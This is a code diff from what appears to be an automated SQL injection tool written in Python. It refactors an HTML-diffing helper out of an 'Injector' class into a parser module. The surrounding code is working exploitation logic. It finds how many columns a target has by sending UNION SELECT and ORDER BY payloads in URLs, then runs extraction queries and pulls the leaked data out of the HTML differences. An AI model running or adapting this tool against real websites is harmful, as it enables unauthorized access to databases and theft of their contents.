@@ -3,7 +3,7 @@
 
 """
 import os, sys
-import builder, scanner
+import builder, parser, scanner
 import re
 from collections import Counter
     
@@ -17,15 +17,9 @@ class Injector:
         self.flags = flags 
         self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
         self.columns_upper_limit_guess = 9
+        self.parse = parser.Parser('') #hackish
         self.scan = scanner.Scanner()
     
-    def html_diff(self, before_injection, after_injection):
-        """ Diffs two lits of HTML.
-            :before_injection: HTML without SQLI
-            :after_injection: HTML with SQLI
-            :returns: list of strings representing difference (hopefully captures SQLI info)
-        """
-        return list(set(after_injection) - set(before_injection))
     
     # Try unions until no SQL errors returned.
     # Return number of columns in exposed table.
@@ -42,7 +36,7 @@ class Injector:
 
         ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!
 
-        while len(self.html_diff(original_page, self.scan.page(union))) == 0 or 'SELECT' in self.html_diff(original_page, self.scan.page(union)):
+        while len(self.parse.html_diff(original_page, self.scan.page(union))) == 0 or 'SELECT' in self.parse.html_diff(original_page, self.scan.page(union)):
             count += 1
             union += ',%20' + str(count + self.offset)
 
@@ -50,7 +44,7 @@ class Injector:
         ### Using ORDER BY x--, x = 9,8,... ###
         count = self.columns_upper_limit_guess
         order_by = page + self.delimiter + 'ORDER' + self.delimiter + 'BY' + self.delimiter + str(count) + '--'
-        while 'Unknown' in self.html_diff(original_page, self.get_page(order_by)) and count > 0:
+        while 'Unknown' in self.parse.html_diff(original_page, self.get_page(order_by)) and count > 0:
             count -= 1
             temp = list(order_by)
             temp[-3] = str(count)
@@ -69,7 +63,7 @@ class Injector:
         union_urls = builder.Builder(page, []).union_nums(self.get_num_columns(page))
         new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
 
-        diff = self.html_diff(self.scan.page(page), self.scan.page(new_url))
+        diff = self.parse.html_diff(self.scan.page(page), self.scan.page(new_url))
         nums = [filter(str.isdigit, str(re.sub('<.*>','', line))) for line in diff]
         #nums.remove('')
 
@@ -84,8 +78,7 @@ class Injector:
         data = {}
         
         for query in queries:
-            data[query] = self.html_diff(default_page, self.scan.page(queries[query]))
-
+            data[query] = self.parse.html_diff(default_page, self.scan.page(queries[query]))
 
         return data
     
